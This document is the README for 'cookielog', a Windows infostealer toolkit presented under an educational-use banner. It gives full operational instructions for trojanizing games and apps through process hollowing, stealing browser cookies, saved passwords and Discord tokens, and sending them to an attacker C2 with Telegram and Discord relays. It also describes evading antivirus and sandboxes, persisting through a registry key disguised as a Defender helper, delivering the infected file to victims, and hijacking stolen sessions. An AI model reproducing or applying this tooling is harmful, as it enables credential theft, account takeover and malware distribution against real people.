# cookielog

```
 ╔══════════════════════════════════════════════════════════════════════╗
 ║                                                                      ║
 ║   EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING          ║
 ║                                                                      ║
 ║   This is offensive security tooling for penetration testing,        ║
 ║   red-team exercises, and security education. It builds an           ║
 ║   infected executable that extracts browser cookies from a           ║
 ║   target machine and exfiltrates them to a remote C2 server.         ║
 ║                                                                      ║
 ║   ONLY use this on systems you own or are explicitly authorized      ║
 ║   to test. Unauthorized use against third-party systems, networks,   ║
 ║   or individuals is illegal in most jurisdictions and may result     ║
 ║   in criminal prosecution.                                           ║
 ║                                                                      ║
 ║   The authors are not responsible for misuse. This code is           ║
 ║   provided for learning how cookie-stealing attacks work so          ║
 ║   that defenders can build detection and mitigation.                 ║
 ║                                                                      ║
 ╚══════════════════════════════════════════════════════════════════════╝
```

Cookie exfiltration toolkit for Windows. Steals cookies from Chromium-based browsers
(Chrome, Edge, Brave, Vivaldi, Opera) and Firefox by injecting a CRT-less payload into a
legitimate host `.exe` via process hollowing. The payload extracts cookies on the victim's
machine and exfiltrates them over HTTP to an attacker-controlled listener, in Cookie-Editor
JSON format that imports directly into a browser.

A legacy Python extractor (`cookielog.py`) and a local named-pipe mode (`sink.py`) are also
included for direct extraction without injection.

---

## Installation

Run the installer — it installs all dependencies automatically:

```bat
install.bat              :: install everything (Python, MSVC, CLI tools, build)
install.bat --check      :: check what's installed (don't install anything)
install.bat --no-build   :: skip MSVC + build (Python + CLI tools only)
install.bat --no-tools   :: skip CLI tools (fzf, bat, ripgrep, clink)
```

What `install.bat` does:

1. **Python pip packages** — `cryptography`, `websocket-client` from `requirements.txt`
2. **MSVC Build Tools 2022** — C++ workload via winget (~2 GB download, needed to compile the
   payload). Python tools work without MSVC; you only need it to run `build.bat`.
3. **CLI tools** — Clink (cmd autocomplete), fzf (fuzzy finder), bat (syntax-highlighted cat),
   ripgrep (fast grep) — all via winget
4. **cmd_init.cmd** — copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
   Linux-style aliases (`ls`, `cat`, `grep`, etc.) load on every cmd.exe start
5. **Build** — runs `build.bat` to compile `loader.exe` + `ckdll.dll` (if MSVC is available)

After installation, start cookielog with:

```bat
auto.bat
```

---

## Relay: Telegram & Discord

The listener (`listen.py`) can forward a summary of every received cookie batch to
Telegram or Discord. This is useful when the attacker's C2 port is firewalled —
the payload still POSTs to your listener over HTTP, and the listener re-sends a
summary to Telegram/Discord over HTTPS (which passes most firewalls).

Both relays are **optional** — if no `--telegram` or `--discord` flag is passed,
the listener just saves cookies to `loot/` as usual.

**Keys are saved automatically** — the first time you pass `--telegram` or `--discord`,
the value is stored in `config.json`. On subsequent runs, just run `python auto.py`
without the flag and the saved key is loaded automatically.

```bat
python auto.py --config             :: show saved keys (masked)
python auto.py --clear-telegram     :: remove saved Telegram token
python auto.py --clear-discord      :: remove saved Discord webhook
```

### Telegram setup

1. **Create a bot** (takes 30 seconds):
   - Open Telegram, search for **@BotFather**
   - Send `/newbot`
   - Pick a name and username (e.g. `mycookielog_bot`)
   - BotFather replies with an **API token** like `8975447629:AAFzK9wam_2jfoZ...`

2. **Get your chat ID** (so the bot knows who to message):
   - Send any message to your new bot (e.g. "hi")
   - Run the helper script (it queries the API and saves to config automatically):
     ```bat
     python tg_chatid.py 8975447629:AAFzK9wam_2jfoZ...
     ```
   - It prints your chat ID and the full `--telegram` string, and saves to `config.json`

3. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```
   Format: `--telegram <bot_token>:<chat_id>`

   Or via `auto.py` (starts listener + infects in one command):
   ```bat
   python auto.py "GET UPSTAIRS (64bit)" --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```

   After the first run, the key is saved — next time just:
   ```bat
   python auto.py "GET UPSTAIRS (64bit)"
   ```

4. **What you receive**: when the victim runs the infected exe, you get a Telegram
   message like:
   ```
   cookielog: 680 cookies received

   Top domains:
     312  google.com
     145  youtube.com
      89  github.com
      ...
   Full JSON: loot/cookies.json
   ```

### Discord setup

1. **Create a webhook** (takes 10 seconds):
   - Open Discord, go to the server where you want notifications
   - **Server Settings** → **Integrations** → **Webhooks** → **New Webhook**
   - Pick a name (e.g. "cookielog"), pick a channel
   - Click **Copy Webhook URL** — it looks like:
     ```
     https://discord.com/api/webhooks/1234567890/abc-def-ghi...
     ```

2. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
   ```
   Or via `auto.py`:
   ```bat
   python auto.py "GET UPSTAIRS (64bit)" --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
   ```

3. **What you receive**: when cookies arrive, the Discord webhook posts a message like:
   ```
   cookielog: **680 cookies** received

   Top domains:
   `  312`  google.com
   `  145`  youtube.com
   `   89`  github.com
   ...
   ```

### Combining both

You can use both relays at the same time:

```bat
python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...:987654321 --discord https://discord.com/api/webhooks/123/abc
```

### Notes

- The relay sends a **summary** (top 15 domains + cookie count), not the full cookie
  JSON — the full data is still saved in `loot/cookies.json` on the listener side.
- Discord has a 2000-character message limit; the summary is truncated to 1900 chars.
- The relay uses Python's `urllib.request` (HTTPS) — no extra pip packages needed.
- If the relay fails (bad token, wrong chat ID, network error), the listener logs
  the error but **still saves cookies locally** — no data is lost.

---

## What's New

### v2 — payload improvements (current)

**Chromium cookie fix (browser-locked DBs):** `CopyFileW` was replaced with
`CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`.
This bypasses the exclusive lock Chrome/Edge hold on their live cookie databases —
cookies are now extracted even when the browser is running (previously only Firefox worked).

**More browsers:** Chromium, Thorium, CocCoc, and Yandex Browser added to the browser
profile list (9 total: Chrome, Edge, Brave, Vivaldi, Opera, Chromium, Thorium, CocCoc, Yandex).

**Discord token extraction:** Scans Discord's LevelDB files (`%APPDATA%\Discord\Local Storage\
leveldb\*.ldb`) for MFA tokens (`mfa.*` pattern) and exfiltrates them as cookie-like entries.

**Browser password extraction:** Reads Chromium `Login Data` SQLite DBs, decrypts saved
passwords with the same AES-256-GCM key used for cookies (v10/v11/v20), and exfiltrates
them with the associated username and origin URL.

**XOR-encrypted payload:** The embedded DLL in `loader.exe` is now XOR-encrypted (16-byte key)
to prevent AV string scanning of cookie-extraction strings (`moz_cookies`, `encrypted_key`,
`Login Data`, etc). The loader decrypts in memory before process hollowing.

**Anti-analysis:** The payload now checks for:
- VM MAC address prefixes (VMware, VirtualBox, Hyper-V, QEMU)
- Debuggers (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`)
- Analysis processes (x64dbg, IDA, Wireshark, Process Hacker, etc.)
- Sleep acceleration (sandbox timing check)
If any check fails, the payload exits silently without extracting cookies.

**Persistence:** `--persist` flag patches a sentinel in the loader that makes the payload
install a `HKCU\...\Run\WindowsDefenderHelper` registry key on the victim, re-executing
the infected exe on every login.

**Telegram + Discord relay:** `listen.py` can relay received cookie summaries to Telegram
Bot API or Discord webhooks, bypassing firewall restrictions on the attacker's C2:

```bat
python auto.py game.exe --telegram 123456:ABC-DEF@bot:987654321
python auto.py game.exe --discord https://discord.com/api/webhooks/123/abc
```

### v1 — `auto.py` one-click setup (GUI + CLI)

A single script that does everything: builds binaries, detects your IP, starts the listener,
infects the target, and optionally runs it locally for testing. Replaces the manual
`start_attack.bat` + `pick.py` workflow for most use cases.

```bat
python auto.py                              :: GUI: pick folder or .exe
python auto.py "GET UPSTAIRS (64bit)"       :: CLI: infect a folder
python auto.py game.exe                     :: CLI: infect a standalone .exe
python auto.py "GET UPSTAIRS (64bit)" --run :: CLI: infect + run locally (test)
python auto.py game.exe --run --port 9420   :: custom port + local test
```

GUI has 4 buttons:
- **SELECT FOLDER (game/app with files)** — copies the folder, finds the main .exe, infects in place
- **SELECT FOLDER + RUN LOCALLY (test)** — same, then runs it on your machine
- **SELECT .EXE (standalone, no folder)** — infects a single .exe
- **SELECT .EXE + RUN LOCALLY (test)** — same, then runs it

### `ifec/folds/` and `ifec/apps/` output structure

Infected outputs are now split by type:

```
ifec/
  folds/    <- exes that need their folder (games, apps with DLLs/data)
    <game folder>/
      <game>.exe       (INFECTED)
      <game>_Data/     (original, intact)
      *.dll            (original, intact)
  apps/     <- standalone exes (no folder dependencies)
    <name>.exe         (INFECTED)
```

Folder mode: `auto.py` copies the entire folder to `ifec/folds/<name>/`, auto-detects the
main .exe (Unity `<name>_Data/` heuristic, fallback to largest .exe, skips helper exes like
`UnityCrashHandler`), and overwrites it with the infected version. The original source folder
is never touched.

### `listen.py` — fast startup fix

`HTTPServer.server_bind()` was overridden to skip `socket.getfqdn("0.0.0.0")`, which does a
reverse DNS lookup that takes **4+ seconds** on Windows. This delayed `listen()` enough that
the payload's HTTP connect failed with `WSAECONNREFUSED` (10061). The fix calls
`TCPServer.server_bind()` directly and uses `socket.gethostname()` (local, instant). The
listener now reaches `LISTENING` state in under 1 second.

### `auto.py --run` — restore fix

The original .exe restore after a local test was failing with `WinError 32` (file locked). Root
cause: the **game process** (launched by the loader's rename-restore) holds the file lock, not
the hollowed `cmd.exe`. Fix: kill the game by exe name (`taskkill /F /IM`) before restore, plus
targeted cleanup of the orphaned `cmd.exe` by `ParentProcessId` (PowerShell, not
`taskkill /IM cmd.exe` which kills ALL cmd.exe).

### Other changes

- **`install.bat`** — one-click dependency installer: Python pip packages, MSVC Build Tools,
  CLI tools (Clink, fzf, bat, ripgrep) via winget, `cmd_init.cmd` setup, autorun registry,
  and payload build. Supports `--check` (status only), `--no-build`, `--no-tools`.
- **`auto.bat`** — shortcut: `python auto.py %*`
- **`cmd_init.cmd`** — Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`, `...`) +
  cookielog shortcuts (`cl_auto`, `cl_pick`, `cl_listen`) + Python shortcuts (`py`, `pi`, `pf`).
  Installed to `%USERPROFILE%\bin\cmd_init.cmd` with autorun registry key.
- **`PAYLOAD_STEPS.txt`** (English) and **`PAYLOAD_STEPS_PTBR.txt`** (Portuguese) — step-by-step
  walkthrough of the payload execution chain (267 lines each).
- **`swap.py --session`** — renamed from `--sessao` to English.
- **All comments, docstrings, and UI strings** translated to English across all source files.

---

## Project structure

```
cookielog/
├── DISCLAIMER            # Educational use disclaimer (read this first)
├── install.bat           # One-click dependency installer (Python, MSVC, CLI tools)
├── auto.py               # One-click: build + listen + infect + test (GUI + CLI)
├── auto.bat              # Shortcut: python auto.py %*
├── pick.py               # GUI infector (standalone, manual C2 config)
├── listen.py             # HTTP listener: receives exfiltrated cookies
├── tg_chatid.py          # Helper: finds Telegram chat ID from bot token
├── sink.py               # Named pipe server (local fallback, no C2 needed)
├── swap.py               # Splits cookies by site (per-site cookies.txt)
├── cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
├── build.bat             # Compiles ckdll.dll + loader.exe (needs MSVC)
├── start_attack.bat      # Starts listener + pick.py GUI together
├── test_curl.bat         # Tests listener with curl
├── cmd_init.cmd          # Linux-style aliases for cmd.exe
├── PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
├── PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
├── requirements.txt      # Python deps
├── config.json           # Saved API keys (auto-generated, gitignored)
├── .gitignore
├── src/
│   ├── ckdll.cpp         # Payload DLL (CRT-less, injectable)
│   ├── loader.cpp        # Loader (process hollowing + rename-restore)
│   ├── payload.h         # Generated byte array of the DLL (auto-generated)
│   └── gen.ps1           # Generates payload.h from ckdll.dll
├── bin/                  # Build output
│   ├── loader.exe        # ~131 KB
│   └── ckdll.dll         # ~24 KB
├── ifec/                 # Infected outputs (gitignored)
│   ├── folds/            # Folder-mode infections (game + dependencies)
│   └── apps/             # Standalone infections (single .exe)
├── loot/                 # Captured cookies (gitignored)
│   ├── cookies.json      # Cookie-Editor JSON (from listen.py)
│   ├── cookies.txt       # Netscape format (from listen.py)
│   ├── cookies_all.json  # From sink.py (pipe mode)
│   └── cookies_all.txt   # From sink.py (pipe mode)
└── tools/
    └── PsExec64.exe      # Sysinternals (for legacy v20 extraction)
```

---

## Quick start

### One-click (recommended)

```bat
:: GUI mode — pick a folder or .exe from a dialog
python auto.py

:: CLI — infect a game folder (copies to ifec/folds/, infects in place)
python auto.py "C:\Games\GET UPSTAIRS (64bit)"

:: CLI — infect + run locally for testing
python auto.py "C:\Games\GET UPSTAIRS (64bit)" --run

:: CLI — infect a standalone .exe (output to ifec/apps/)
python auto.py "C:\Tools\app.exe"
```

`auto.py` does everything automatically:

1. Checks if `loader.exe` + `ckdll.dll` exist; if not, runs `build.bat`
2. Detects your local IP (UDP connect to 8.8.8.8)
3. Starts `listen.py` in a new console window
4. Infects the target (folder mode copies the folder; standalone mode just infects the file)
5. Without `--run`: prints instructions (send `ifec/folds/` or `ifec/apps/` to the victim)
   With `--run`: executes the infected exe, waits for cookies, kills the game, restores

### Manual (pick.py)

```bat
:: start listener + infector GUI together
start_attack.bat

:: or run pieces manually
python listen.py 9090          :: terminal 1 (listener)
python pick.py                  :: terminal 2 (infector GUI)
```

In the `pick.py` GUI:

1. The C2 URL field is pre-filled with `http://<auto-detected-local-IP>:9090/`. Edit if needed.
2. Click **Browse** and select a host `.exe`.
3. Click **Infect**. The infected binary is written to `ifec/<name>.exe`.
4. Send `ifec/<name>.exe` to the victim.

---

## Attack flow

The end-to-end infection and exfiltration chain:

1. **Attacker runs `auto.py`.** It builds binaries (if needed), detects the local LAN IP,
   starts `listen.py` on the chosen port, and infects the target.
2. **Infection.** `auto.py` (or `pick.py`) appends the original host bytes to `loader.exe` and
   patches the C2 URL into the embedded payload via sentinel patching.
   - **Folder mode:** copies the entire game/app folder to `ifec/folds/<name>/` and overwrites
     the main .exe with the infected version.
   - **Standalone mode:** writes the infected .exe to `ifec/apps/<name>.exe`.
3. **Delivery.** The attacker sends `ifec/folds/<name>/` (folder) or `ifec/apps/<name>.exe`
   (standalone) to the victim.
4. **Victim runs it.** The host app/game opens normally (rename-restore preserves the original
   exe name, which Unity games require), and a hidden payload runs via process hollowing of
   `cmd.exe`.
5. **Extraction.** The payload extracts cookies from Chrome / Edge / Brave / Vivaldi / Opera
   (Chromium-based) and Firefox on the **victim's** machine.
6. **Exfiltration.** The payload sends the cookies via HTTP POST (Winsock2) to the attacker's
   C2 URL as Cookie-Editor JSON.
7. **Reception.** `listen.py` receives the JSON, merges/dedups against the existing collection
   (keyed on `domain`+`name`+`path`), and writes `loot/cookies.json` + `loot/cookies.txt`.
8. **Import.** The attacker imports `loot/cookies.json` into their own browser via the
   Cookie-Editor extension.

---

## Usage reference

### `auto.py` — one-click setup

```bat
python auto.py                              :: GUI (file/folder picker)
python auto.py <folder>                     :: infect folder -> ifec/folds/
python auto.py <file.exe>                   :: infect standalone -> ifec/apps/
python auto.py <folder> --run               :: infect + run locally (test)
python auto.py <folder> --run --port 9420   :: custom port
python auto.py --cli                        :: force CLI (skip GUI)
```

Options:

| Flag | Effect |
|---|---|
| `--port N` | C2 listener port (default: 9090) |
| `--run` | Run the infected exe locally after infecting (test mode) |
| `--cli` | Force CLI mode (no GUI dialog) |
| *(path arg)* | Path to a folder or .exe (auto-detected) |

In `--run` mode, the C2 URL is forced to `http://127.0.0.1:<port>/` for reliability.

### `pick.py` — manual infector GUI

```bat
python pick.py          :: GUI
python pick.py --cli    :: headless
```

Features: auto IP detection, C2 URL field, browse for .exe, infect, view JSON/TXT, open
`loot/`/`ifec/`/`drop.json`, rebuild, stop sink. Tag map for target classification
(`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).

### `listen.py` — HTTP listener

```bat
python listen.py [port]    :: default port 8080
```

- Forces IPv4 (`HTTPServerV4` with `address_family = socket.AF_INET`)
- Overrides `server_bind()` to skip `getfqdn()` (4s DNS delay fix)
- Outputs: `loot/cookies.json` (Cookie-Editor) + `loot/cookies.txt` (Netscape)
- Dedup by `(domain, name, path)`

### `cookielog.py` — legacy extractor

Direct Python extraction with no injection. Reads browser SQLite databases directly and
decrypts with DPAPI + AES-GCM. Works on Chrome <127, Edge, Brave, Vivaldi, Opera, and Firefox.

```bat
python cookielog.py                    :: one-shot -> cookies_all.json + cookies_all.txt
python cookielog.py --live             :: continuous, logs changes to cookie_log.jsonl
python cookielog.py --firefox          :: filter to one browser
python cookielog.py --chrome --edge --brave
```

Outputs go to the repo root: `cookies_all.json` + `cookies_all.txt`.

**Chrome >=127 app-bound (v20) key.** Chrome 127+ uses an encryption key bound to
`elevation_service.exe` via machine DPAPI. Extraction requires three stages:

```bat
:: stage 1: MACHINE DPAPI (must run as SYSTEM via PsExec)
tools\PsExec64.exe -s -i -accepteula python cookielog.py --v20-sys

:: stage 2: USER DPAPI (back to your own user)
python cookielog.py --v20-usr

:: stage 3: extract
python cookielog.py
```

Stage 2 writes the decrypted key to `C:\ProgramData\cookielog\v20.key`, which stage 3 reads.

### `swap.py` — post-processing

Splits the captured cookies into per-site Netscape files for selective import:

```bat
python swap.py                         :: list sites on hand
python swap.py netflix                 :: swap\netflix.com.txt (non-expired)
python swap.py netflix --session       :: live session only
python swap.py netflix --session --keep :: session with artificial expiry
python swap.py google --auth           :: auth cookies only
```

Generates `swap\<site>.txt` in Netscape format, importable via Cookie-Editor -> Import.
`--keep` gives session cookies an artificial expiry so the browser doesn't discard them on
tab close; `--auth` keeps only cookies whose names match login/token patterns.

### `build.bat` — compile

Compiles the payload DLL and the loader. Requires MSVC (`cl.exe`).

```bat
build.bat
```

Produces:

- `bin\ckdll.dll` — payload (~24 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`)
- `bin\loader.exe` — loader (~131 KB, `/MT` static CRT, GUI subsystem)
- `src\payload.h` — the DLL as a byte array, embedded into the loader

### Testing the listener

```bat
:: terminal 1
python listen.py 9090

:: terminal 2
test_curl.bat 9090
```

`test_curl.bat` POSTs a single fake cookie via `curl`. If the listener prints
`[+] 1 cookies received` and replies `ok`, the HTTP path works.

---

## Output files

| File | What it is | Produced by |
|---|---|---|
| `ifec/folds/<name>/<name>.exe` | Infected exe (folder mode, with dependencies) | `auto.py` |
| `ifec/apps/<name>.exe` | Infected exe (standalone mode) | `auto.py` |
| `ifec/<name>.exe` | Infected exe (legacy, from `pick.py`) | `pick.py` |
| `loot/cookies.json` | Cookie-Editor JSON (browser-importable) | `listen.py` |
| `loot/cookies.txt` | Netscape format (curl/wget) | `listen.py` |
| `loot/cookies_all.json` | All cookies JSON (pipe mode) | `sink.py` |
| `loot/cookies_all.txt` | Netscape format (pipe mode) | `sink.py` |
| `cookies_all.json` | All cookies JSON (repo root) | `cookielog.py` |
| `cookies_all.txt` | Netscape format (repo root) | `cookielog.py` |
| `cookie_log.jsonl` | Continuous change log (one line per change) | `cookielog.py --live` |
| `swap/<site>.txt` | Per-site Netscape cookies | `swap.py` |
| `C:\ProgramData\cookielog\v20.key` | Decrypted Chrome v20 app-bound key | `cookielog.py --v20-usr` |
| `C:\ProgramData\cookielog\drop.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
| `C:\ProgramData\cookielog\debug.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |

---

## Technical details

### Process hollowing

The loader injects the payload by hollowing a fresh `cmd.exe`:

1. `CreateProcessW(cmd.exe, CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB)` — suspended, no
   console window.
2. `NtUnmapViewOfSection` — unmaps the original `cmd.exe` image at its base address.
3. `VirtualAllocEx` at the payload's preferred `ImageBase`.
4. `WriteProcessMemory` — writes the PE headers and each section from the embedded
   `g_payload[]` byte array.
5. IAT fixup — resolves imports from system DLLs (same base in all processes of the session).
6. `NtCreateThreadEx` with the `HIDE_FROM_DEBUGGER` (`0x1`) flag on the payload entry point.
7. The main thread is **never resumed** — the original entry point was unmapped; resuming it
   would cause an access violation. The payload runs entirely on the remote thread.

### Infected .exe format

A standalone infected binary is the loader with the original host appended:

```
[loader.exe bytes][host.exe bytes][host_len:uint32 LE][magic "CKLG":4]
```

On launch, the loader detects the trailing `CKLG` magic, reads `host_len`, extracts the
original host bytes, and runs them. The original host file on disk is never modified — the
infected copy lives in `ifec/`.

### Rename-restore

When the victim double-clicks the infected `.exe`, the loader must execute the host under
its **original filename**. It:

1. Renames the infected exe to a hidden `~ck_bak.bin` in the same directory.
2. Writes the extracted original host bytes back to the original filename.
3. Executes the restored file.

This is required for **Unity games**, which derive their data path from the exe name (they
look for `<exename>_Data/`). If the host were extracted as `~ck_tmp.exe`, Unity would look
for `~ck_tmp_Data/` and fail with an error window. Rename-restore preserves the name so
Unity finds `_Data/`, `UnityPlayer.dll`, etc.

If AV blocks the rename, the loader falls back to extracting as `~ck_tmp.exe` (works for
apps that don't depend on their own filename). The `~ck_bak.bin` backup is either deleted
immediately or scheduled for deletion on next reboot (`MOVEFILE_DELAY_UNTIL_REBOOT`).

### C2 sentinel patching

In `ckdll.cpp`, the C2 URL buffer is declared with a recognizable sentinel:

```c
static char g_c2_url[256] = "CKC2_DEADBEEF_";   // 14-byte sentinel
```

`auto.py` / `pick.py` searches the compiled `loader.exe` for the 14-byte `CKC2_DEADBEEF_`
sentinel and overwrites the 256-byte `g_c2_url` buffer with the attacker's C2 URL (e.g.
`http://10.0.0.5:9090/`). At runtime, the payload checks whether `g_c2_url` still starts with
`CKC2`; if it was replaced, it exfiltrates via HTTP POST. If the sentinel is intact (no C2
configured), the payload falls back to the local pipe / file path.

### Winsock2 exfiltration

The payload uses raw **Winsock2** (`WSAStartup` -> `socket` -> `inet_addr` -> `connect` ->
`send`) for the HTTP POST, not WinHTTP/WinINet. WinHTTP/WinINet fail inside a hollowed process
with error `12029` ("proxy configuration unavailable") because the hollowed `cmd.exe` never
initialized the WinHTTP proxy subsystem. Raw Winsock2 has no such dependency.

The HTTP request is built manually (`POST / HTTP/1.1\r\nHost: ...\r\nContent-Length: ...\r\n
Connection: close\r\n\r\n`) and the body is sent in 32 KB chunks.

Exfiltration priority in the payload:

1. **HTTP POST to C2** — if the sentinel was patched with a URL.
2. **Named pipe** `\\.\pipe\ck_pipe` — if `sink.py` is running locally (20 retries, 250ms each).
3. **Local file** `C:\ProgramData\cookielog\drop.json` — final fallback.

### CRT-less payload DLL

`ckdll.dll` is built without the C runtime to stay small and injectable:

- `/NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000`
- `/GUARD:NO /MACHINE:X64`, linked against `kernel32.lib crypt32.lib bcrypt.lib` only.
- Custom `memcpy` / `memset` / `memmove` implementations (no CRT).
- `/Od /Oi-` — **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
  inside the hollowed process; disabling intrinsics prevents that.

`gen.ps1` converts the compiled `ckdll.dll` into `src/payload.h` (a `g_payload[]` byte array),
which `loader.cpp` embeds.

### Cookie-Editor JSON format

All extractors emit cookies in Cookie-Editor JSON, directly importable via the browser
extension:

```json
{
  "domain": ".example.com",
  "name": "sessionid",
  "value": "abc123",
  "path": "/",
  "expirationDate": 1735689600,
  "secure": true,
  "httpOnly": true,
  "sameSite": "Lax",
  "hostOnly": false,
  "session": false
}
```

`hostOnly` is `true` when the domain does not start with `.`. `session` is `true` when
`expirationDate` is `0`. `sameSite` is normalized across browsers (Chromium encodes
2=None/1=Strict/0=Lax; Firefox encodes 0=None/1=Lax/2=Strict — the payload translates both).

### Chromium cookie decryption

Chromium stores cookie values encrypted with AES-256-GCM:

1. **v10/v11 key** — the `encrypted_key` in `Local State` is base64 + DPAPI-wrapped. The
   payload calls `CryptUnprotectData` (user DPAPI) to recover the 32-byte key.
2. **Cookie value** — `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
   (`BCryptOpenAlgorithmProvider` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt`): 3-byte
   prefix, 12-byte IV/nonce, ciphertext, 16-byte GCM tag.

### Firefox cookies

Firefox stores cookies as **plaintext** in `cookies.sqlite` (`moz_cookies.value`). No
decryption is needed; the payload reads `name`, `value`, `host`, `path`, `expiry`,
`isSecure`, `isHttpOnly`, `sameSite` directly.

### CopyDb (bypassing browser file locks)

Browsers hold an exclusive lock on their live `Cookies` SQLite database. The payload calls
`CopyFileW` to copy the database (and its `-wal`/`-shm` companions) to `%TEMP%\ck_db.tmp`
before opening it read-only with SQLite. This bypasses the lock without needing to close the
running browser. If the copy fails (browser has an exclusive lock), that browser's cookies
are skipped.

### `auto.py --run` local test flow

1. Backup original .exe to `.orig` (standalone mode only; folder mode skips this — the
   loader's rename-restore handles it).
2. Copy infected exe over original (standalone) or run directly from `ifec/folds/` (folder).
3. Execute — the loader opens the game, does process hollowing, runs the payload.
4. Wait 10s (game opens + payload starts).
5. Kill the loader process.
6. Wait 25s (payload extraction + HTTP exfiltration).
7. Kill the game by exe name (`taskkill /F /IM`).
8. Kill orphaned hollowed `cmd.exe` by `ParentProcessId` (PowerShell, targeted).
9. Restore original .exe (standalone mode only, 5 retries with 3s intervals).
10. Wait for cookies in `loot/cookies.json` (5 min timeout).

---

## Build requirements

- **Windows 10/11 x64**
- **Python 3.8+** (tested with 3.14)
- **MSVC (`cl.exe`)** — Visual Studio 2022 Build Tools, C++ workload — only needed to compile
  the payload (`build.bat`). The legacy Python extractors and listener need no compiler.
- **Python deps:**

  ```bat
  pip install -r requirements.txt
  ```

  Installs `cryptography` (DPAPI / AES-GCM for `cookielog.py`) and `websocket-client` (CDP,
  used by the legacy live mode).
- **PsExec64.exe** — included under `tools/`. Only needed for the Chrome >=127 v20 app-bound
  key extraction (`cookielog.py --v20-sys`).

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `connect failed: 10061` in debug.log | Listener not up or wrong port — `listen.py` was slow to start (getfqdn DNS delay) | Fixed in current `listen.py` (server_bind override). Ensure `listen.py` is running before the victim executes |
| `WinError 32` restoring original .exe after `--run` | Game process holds the file lock | Fixed in current `auto.py` (kills game by name + targeted cmd.exe by PID). Close the game manually if retries fail |
| Unity "Error" window on the host | Host was extracted as `~ck_tmp.exe`, so Unity looked for `~ck_tmp_Data/` | Rename-restore (default) preserves the original exe name; ensure the rename to `~ck_bak.bin` isn't blocked by AV |
| WinHTTP error `12029` | WinHTTP/WinINet fail inside a hollowed process (proxy config unavailable) | The payload uses Winsock2, not WinHTTP — rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
| `loader: base 0x5F000000 occupied` | Another process already mapped the payload's fixed base address | Use a different host `.exe`, or reboot / close the conflicting process |
| Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
| No Chromium cookies decrypted | Chrome >=127 uses the app-bound v20 key, which isn't present | Run `cookielog.py --v20-sys` (as SYSTEM via PsExec) then `--v20-usr` to generate `v20.key`, then re-extract |
| `DumpChromium: copy failed (browser running?)` | Browser holds an exclusive lock on the cookie DB and `CopyFileW` failed | Close the browser before running the payload, or rely on Firefox cookies (Firefox doesn't lock) |
| Invalid JSON at listener | Old payload emitting a leading comma before the first record | Rebuild the payload with `build.bat` (current code uses `FieldS0` for the first record) |
| DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
| `[-] no MSVC` during build | Visual Studio C++ Build Tools not installed | Install VS 2022 Build Tools with the C++ workload and run from a Developer Command Prompt |
| No cookies in `loot/` after local test | Payload fell back to `drop.json` because no C2 and `sink.py` wasn't running | Either set a C2 URL + run `listen.py`, or run `sink.py` for pipe mode; check `C:\ProgramData\cookielog\drop.json` |

---

## `.bat` / shortcut scripts

| Script | What it does |
|---|---|
| `install.bat` | One-click dependency installer (Python, MSVC, CLI tools, build, cmd_init) |
| `auto.bat` | Shortcut: `python auto.py %*` |
| `tg_chatid.py` | Finds Telegram chat ID from bot token, saves to `config.json` |
| `start_attack.bat` | Launches `listen.py` (port 9090) + `pick.py` GUI together |
| `test_curl.bat` | POSTs a fake cookie to the listener via `curl` to verify it works |
| `build.bat` | Compiles `ckdll.dll` + `loader.exe` (generates `payload.h`) |
| `cmd_init.cmd` | Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`) + cookielog + Python shortcuts |
